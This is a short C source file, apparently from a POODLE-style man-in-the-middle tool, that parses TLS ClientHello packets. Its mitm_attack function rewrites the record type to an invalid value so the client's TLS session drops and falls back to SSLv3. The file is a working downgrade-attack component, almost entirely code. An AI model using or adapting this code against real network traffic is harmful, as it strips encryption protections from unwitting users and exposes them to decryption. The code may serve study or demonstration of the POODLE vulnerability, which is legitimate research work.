/*
 * poodim.c
 */

#include "sysincludes.h"
#include "error.h"

/*
 ClientHello packet (from RFC5246)

 offset bytes field
      0     1 record_type
      1     1 version (major)
      2     1 version (minor)
      3     2 length
      5     1 msg_type - handshake type
      6     3 length   - bytes in message
      9     1 client_version (major)
     10     1 client_version (minor)
     11    32 random   - A client-generated random structure
     43     1 session_id
     44       cipher_suites
              compression_methods
              exptensions
 */

/*
  This early version does not need any of OpenSSL functions.
  We simply copy OpenSSL labels here before we need to link OpenSSL.
 */
#define SSL3_RT_CHANGE_CIPHER_SPEC 20
#define SSL3_RT_ALERT              21
#define SSL3_RT_HANDSHAKE          22
#define SSL3_RT_APPLICATION_DATA   23
#define TLS1_RT_HEARTBEAT          24
#define SSL3_MT_CLIENT_HELLO 0x01
#define SSL3_VERSION_MAJOR   0x03
#define SSL3_VERSION_MINOR   0x00

int is_ssl_clienthello(unsigned char *buf, size_t bufsize) {
    // referred to ssl23_get_client_hello
    return (bufsize>=44 &&
        buf[0] == SSL3_RT_HANDSHAKE &&
        buf[1] == SSL3_VERSION_MAJOR &&
        buf[5] == SSL3_MT_CLIENT_HELLO);
}

void mitm_attack(unsigned char **buf, size_t bufsize) {
    if ( !buf )
        return;

    unsigned char *payload = *buf;

    if ( is_ssl_clienthello(payload, bufsize) ) {
        Notice2("detected ClientHello of SSLv%d.%d", payload[9], payload[10]);

        if ( payload[9]==SSL3_VERSION_MAJOR && payload[10]>SSL3_VERSION_MINOR ) {
            // it's time to go crazy to trigger fallback
            // by injecting invalid record type
            payload[0]=0x40;
            Notice("cracked the packet (this tcp session will be terminated)");
        }
    }
}
